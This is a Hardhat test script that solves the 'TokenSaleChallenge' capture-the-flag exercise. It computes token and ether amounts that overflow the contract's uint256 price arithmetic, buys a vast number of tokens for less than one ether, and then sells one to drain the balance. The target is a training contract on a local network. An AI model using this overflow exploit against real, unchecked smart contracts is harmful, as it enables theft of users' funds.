import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider, BigNumber, constants } = ethers;

describe('', () => {
  let target: Contract;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    await network.provider.request({
      method: 'hardhat_reset',
      params: [],
    });

    [owner, attacker] = await ethers.getSigners();

    const targetFactory = await ethers.getContractFactory('TokenSaleChallenge');
    target = await targetFactory.deploy(attacker.address, {
      value: utils.parseEther('1'),
    });
    await target.deployed();

    console.log('deployed on', target.address);
  });

  it('exploit', async () => {
    const MAX_UINT256_VALUE = constants.MaxUint256; // (2**256 - 1)
    const TOKEN_PRICE = utils.parseEther('1'); // (10**18)

    const ETH_TO_STEAL = MAX_UINT256_VALUE.mod(TOKEN_PRICE);
    const TOKENS_TO_BUY = MAX_UINT256_VALUE.sub(ETH_TO_STEAL).div(TOKEN_PRICE).add(1);
    const ETHER_TO_SEND = TOKEN_PRICE.sub(ETH_TO_STEAL).sub(1);

    console.log('TOKENS_TO_BUY:', TOKENS_TO_BUY.toString());
    console.log('ETHER_TO_SEND:', ETHER_TO_SEND.toString());

    let tx;
    console.log('buying tokens');
    tx = await target.connect(attacker).buy(TOKENS_TO_BUY, {
      value: ETHER_TO_SEND,
    });
    await tx.wait();

    console.log('selling tokens');
    tx = await target.connect(attacker).sell(1);
    await tx.wait();
  });

  after(async () => {
    expect(await target.isComplete()).to.equal(true);
  });
});
